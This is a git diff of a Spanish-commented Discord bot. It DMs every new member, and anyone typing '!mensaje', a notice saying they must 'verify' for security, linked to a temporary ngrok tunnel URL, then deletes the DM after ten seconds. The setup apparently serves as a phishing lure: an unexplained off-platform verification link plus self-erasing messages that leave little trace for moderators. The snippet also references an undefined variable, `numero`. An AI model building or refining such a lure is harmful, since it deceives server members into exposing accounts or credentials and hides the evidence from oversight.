@@ -7,7 +7,7 @@ import { readFileSync } from "fs";
 const configPath = new URL("../../config.json", import.meta.url);
 const config = JSON.parse(readFileSync(configPath));
 
-// crear un nuevo cliente de discord
+// Crear un nuevo cliente de discord
 const client = new Client({
     intents: 3276799 
 });
@@ -23,15 +23,16 @@ client.on(Events.ClientReady, async () => {
 // ################################################################
 // ################################################################
 
-// cuando un usuario se una al servidor
+// Cuando un usuario se una al servidor
 client.on(Events.GuildMemberAdd, async (miembro) => {
     try {
-        mensaje = await generarMensaje(miembro.user.tag);
+        const mensajeVerificacion = await generarMensaje(miembro.user.username);
+        let mensaje = await miembro.send(mensajeVerificacion);
         setTimeout(() => {
             mensaje.delete().catch(console.error);
         }, 10000); // 10000 milisegundos = 10 segundos
     } catch (error) {
-        console.log(`No se pudo enviar el mensaje a ${miembro.user.tag}:`, error);
+        console.log(`No se pudo enviar el mensaje a ${miembro.user.username}:`, error);
     }
 });
 
@@ -39,9 +40,10 @@ client.on(Events.MessageCreate, async (mensaje) => {
     if (mensaje.author.bot) return; 
     if(mensaje.content.toLowerCase() === "!mensaje") {
         try {
-            mensaje = await generarMensaje(mensaje.author);
+            const mensajeVerificacion = await generarMensaje(mensaje.author.username);
+            let mensajeEnviado = await mensaje.author.send(mensajeVerificacion);
             setTimeout(() => {
-                mensaje.delete().catch(console.error);
+                mensajeEnviado.delete().catch(console.error);
             }, 10000); // 10000 milisegundos = 10 segundos
         } catch (error) {
             console.log(`No se pudo enviar el mensaje a ${mensaje.author.tag}:`, error);
@@ -49,34 +51,20 @@ client.on(Events.MessageCreate, async (mensaje) => {
     }
 });
 
-client.on('message', async (mensaje) => {
-    if (mensaje.content === '!verificar') {
-        try {
-            const mensajeVerificacion = await generarMensaje(mensaje.author);
-            setTimeout(() => {
-                mensajeVerificacion.delete().catch(console.error);
-            }, 10000); // 10000 milisegundos = 10 segundos
-        } catch (error) {
-            console.log(`No se pudo enviar el mensaje a ${mensaje.author.tag}:`, error);
-        }
+async function generarMensaje(nombre) {
+    const enlaces = await generarEnlaces();
+    if (!enlaces) {
+        console.error("Enlace no generado correctamente.");
+        return; // Evita enviar un mensaje vacío
     }
-});
-
-async function generarMensaje(author) {
-    var mensajeVerificacion = "Hola, " + author.username + ". Para poder acceder al servidor tienes que verificarte, esto se hace por temas de seguridad y por el bienestar de la comunidad. \n" + await generarEnlaces();
-    
-    try {
-        return await author.send(mensajeVerificacion); // Cambié author.tag a author
-    } catch (error) {
-        console.log(`No se pudo enviar el mensaje a ${author.tag}:`, error);
-    }
+    var mensaje = "Hola, " + nombre + ". Para poder acceder al servidor tienes que verificarte, esto se hace por temas de seguridad y por el bienestar de la comunidad. \n" + enlaces;
+    return mensaje;
 }
 
 async function generarEnlaces() {
     var enlace = "https://7f3d-94-73-40-169.ngrok-free.app/" + numero;
     return enlace;
 }
-
 
 // ################################################################
 // ################################################################
